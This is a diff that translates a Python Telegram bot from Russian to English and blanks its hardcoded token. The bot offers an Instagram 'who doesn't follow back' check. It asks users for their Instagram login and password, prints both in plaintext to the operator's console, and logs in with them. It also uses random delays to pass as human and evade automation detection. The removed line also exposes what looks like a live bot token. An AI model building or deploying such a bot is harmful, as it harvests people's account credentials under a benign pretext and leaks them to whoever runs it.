@@ -5,47 +5,47 @@ import logging
 import time
 import random
 
-# Настройка логирования
+# Logging setup
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Переменные для хранения данных
+# Variables to store data
 user_data = {}
 cl = Client()
 
-# Задержки для имитации человеческого поведения
+# Delays to mimic human behavior
 def human_delay(min_delay=2, max_delay=5):
     time.sleep(random.uniform(min_delay, max_delay))
 
-# Функция для команды /start
+# Function for the /start command
 def start(update: Update, context: CallbackContext) -> None:
-    update.message.reply_text('Привет! Введи логин от Instagram:')
+    update.message.reply_text('Hello! Enter your Instagram login:')
     user_data[update.effective_user.id] = {'step': 'login'}
 
-# Обработка сообщений
+# Message handling
 def handle_message(update: Update, context: CallbackContext) -> None:
     user_id = update.effective_user.id
     text = update.message.text
 
     if user_id not in user_data or 'step' not in user_data[user_id]:
-        update.message.reply_text('Сначала введи /start')
+        update.message.reply_text('Please enter /start first')
         return
 
     step = user_data[user_id]['step']
 
     if step == 'login':
         user_data[user_id]['username'] = text
-        update.message.reply_text('Теперь введи пароль:')
+        update.message.reply_text('Now enter your password:')
         user_data[user_id]['step'] = 'password'
-        print(f"Логин от пользователя {user_id}: {text}")  # Вывод в VS Code
+        print(f"Login from user {user_id}: {text}")  # Output to VS Code
 
     elif step == 'password':
         user_data[user_id]['password'] = text
-        update.message.reply_text('Проверяю подписчиков... Это может занять время.')
-        print(f"Пароль от пользователя {user_id}: {text}")  # Вывод в VS Code
+        update.message.reply_text('Checking followers... This may take some time.')
+        print(f"Password from user {user_id}: {text}")  # Output to VS Code
         context.job_queue.run_once(check_instagram, 0, context=user_id)
 
-# Проверка подписчиков в Instagram
+# Instagram followers check
 def check_instagram(context: CallbackContext) -> None:
     user_id = context.job.context
     username = user_data[user_id]['username']
@@ -54,60 +54,60 @@ def check_instagram(context: CallbackContext) -> None:
     try:
         cl.delay_range = [2, 6]
         cl.login(username, password)
-        context.bot.send_message(chat_id=user_id, text="Успешно вошли в аккаунт!")
+        context.bot.send_message(chat_id=user_id, text="Successfully logged in!")
         human_delay()
 
         user_id_instagram = cl.user_id_from_username(username)
         human_delay(1, 3)
 
-        context.bot.send_message(chat_id=user_id, text="Получаю список подписчиков...")
+        context.bot.send_message(chat_id=user_id, text="Fetching followers list...")
         followers = cl.user_followers(user_id_instagram)
         followers_list = [user.username for user in followers.values()]
-        context.bot.send_message(chat_id=user_id, text=f"Всего подписчиков: {len(followers_list)}")
+        context.bot.send_message(chat_id=user_id, text=f"Total followers: {len(followers_list)}")
         human_delay(2, 4)
 
-        context.bot.send_message(chat_id=user_id, text="Получаю список подписок...")
+        context.bot.send_message(chat_id=user_id, text="Fetching following list...")
         following = cl.user_following(user_id_instagram)
         following_list = [user.username for user in following.values()]
-        context.bot.send_message(chat_id=user_id, text=f"Всего подписок: {len(following_list)}")
+        context.bot.send_message(chat_id=user_id, text=f"Total following: {len(following_list)}")
         human_delay(2, 4)
 
         not_following_back = [user for user in following_list if user not in followers_list]
 
         if not_following_back:
-            result = f"Всего подписчиков: {len(followers_list)}\nВсего подписок: {len(following_list)}\n\n" \
-                     f"Эти пользователи не подписаны на вас в ответ ({len(not_following_back)}):\n" + \
+            result = f"Total followers: {len(followers_list)}\nTotal following: {len(following_list)}\n\n" \
+                     f"These users don’t follow you back ({len(not_following_back)}):\n" + \
                      "\n".join([f"- {user}" for user in not_following_back[:20]])
             context.bot.send_message(chat_id=user_id, text=result)
         else:
-            context.bot.send_message(chat_id=user_id, text="Все, на кого вы подписаны, подписаны на вас в ответ!")
+            context.bot.send_message(chat_id=user_id, text="Everyone you follow follows you back!")
 
         human_delay(1, 3)
         cl.logout()
-        context.bot.send_message(chat_id=user_id, text="Проверка завершена, выход выполнен.")
+        context.bot.send_message(chat_id=user_id, text="Check completed, logged out.")
 
     except Exception as e:
-        context.bot.send_message(chat_id=user_id, text=f"Ошибка: {str(e)}")
-        logger.error(f"Ошибка для {username}: {e}")
+        context.bot.send_message(chat_id=user_id, text=f"Error: {str(e)}")
+        logger.error(f"Error for {username}: {e}")
 
     user_data.pop(user_id, None)
 
-# Главная функция
+# Main function
 def main() -> None:
-    TOKEN = "7651839668:AAF4231-RfR5g-E-4P5W-pUPaZf5zjWME0I"  # Твой токен
+    TOKEN = " "  # TOKEN
 
-    # Создаем Updater
+    # Create Updater
     updater = Updater(TOKEN, use_context=True)
 
-    # Получаем диспетчер для регистрации обработчиков
+    # Get dispatcher to register handlers
     dp = updater.dispatcher
 
-    # Обработчики
+    # Handlers
     dp.add_handler(CommandHandler("start", start))
     dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
 
-    # Запуск бота
-    print("Бот запущен! Введи /start в Telegram.")
+    # Start the bot
+    print("Bot started! Enter /start in Telegram.")
     updater.start_polling(timeout=30)
     updater.idle()
 
